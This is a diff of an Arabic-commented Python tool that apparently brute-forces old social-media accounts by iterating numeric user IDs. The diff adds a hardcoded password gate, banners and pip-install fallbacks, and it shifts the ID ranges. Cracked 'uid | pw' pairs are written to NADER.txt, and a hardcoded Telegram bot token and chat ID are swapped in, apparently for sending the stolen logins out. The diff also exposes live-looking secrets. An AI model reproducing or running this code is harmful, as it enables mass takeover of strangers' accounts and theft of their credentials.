@@ -1,3 +1,80 @@
+print('\033[1;32m')
+print('-----------------------------------------------------------')
+print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
+print('-----------------------------------------------------------')
+print('-----------------------------------------------------------')
+print('\033[1;35m ادخل كلمه السر')
+print('\033[1;32m')
+print('-----------------------------------------------------------')
+print('                           \033[1;31mN\033[1;32mA\033[1;33mD\033[1;34mE\033[1;35mR\033[1;32m')
+print('-----------------------------------------------------------')
+name = input ('Entre password : \033[1;34m')
+print('\033[1;32m')
+print('\033[132m-----------------------------------------------------------')
+if name == 'nader2006' : 
+	print('\033[1;35m كلمه السر صح')
+	print ('اهلا وسهلا بك في اداتي')
+else :
+   print ('\033[1;31m كلمه السر غلط ')
+   exit()
+import os
+try:
+    import uuid
+except:
+    os.system('pip install uuid')
+
+try:
+    from random import *
+except:
+    os.systeam('pip install random ')
+
+try:
+    import string
+except:
+    os.system('pip install string')
+
+try:
+    import requests
+except:
+    os.system('pip install requests ')
+
+try:
+    from user_agent import generate_user_agent
+except:
+    os.system('pip install user_agent ')
+
+try:
+    from datetime import datetime
+except:
+    os.system('pip install datetime ')
+
+try:
+    import time
+except:
+    os.system('pip install time')
+else:
+    os.system('clear')
+    try:
+        import pyfiglet
+    except:
+        os.system('pip install pyfiglet')
+    else:
+        os.system('clear')
+        import pyfiglet, os
+        from time import sleep
+        import webbrowser
+        Z = '\x1b[2;31m'
+        G = '\x1b[1;32m'
+        A = '\x1b[2;39m'
+        C = '\x1b[2;35m'
+        B = '\x1b[2;36m'
+        C = '\x1b[2;35m'
+        sleep(0.1)
+        P55 = pyfiglet.figlet_format('NADER')
+        print(G + P55)
+        sleep(2)
+        os.system('clear')
+        metal='\033[1;32m المطور نادر ✅✅'
 import os
 import time
 import sys
@@ -566,7 +643,7 @@ class Main:
 		self.loop = 0
 
 		print(logo)
-		print(" \033[1;32m[1]  اداه صيد 2009 فقط")
+		print(" \033[1;32m[1]  اداه صيد 2007")
 		#print(" \033[1;32m[2] صيد 2006 فقط")
 		print("\033[1;31m [E] خروج \n")
 		UZAIR =input(" \033[1;33mاختار رقم : ")
@@ -587,9 +664,9 @@ class Main:
 			Main()
  
 	def old(self):
-		x = 1111111
-		xx = 9999999
-		idx = "10000000"
+		x = 11000000
+		xx = 99999999
+		idx = "6"
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[1;34m اختار رقم الفحص \n \033[1;32m10000 \n \033[1;35m20000 \n \033[1;31m30000 \n \033[1;33m40000 \n \033[1;36m50000 \n \033[1;32m اختار رقم:"))
 		if limit>50000:
@@ -1458,7 +1535,7 @@ class Main:
 				
 				self.cp.append("%s|%s"%(uid, pw))
 				open("NADER.txt","a").write(" %s | %s\n"%(uid, pw))
-				token = '6118299145:AAFxSlwEAsoJH9ylfjA8E4SE9546lOuS3k4'
+				token = '6065926852:AAGTgYqvGbKAKqhSjB2WVetHPXgv4IYSOv8'
 
 				ID = '5868677803'
 
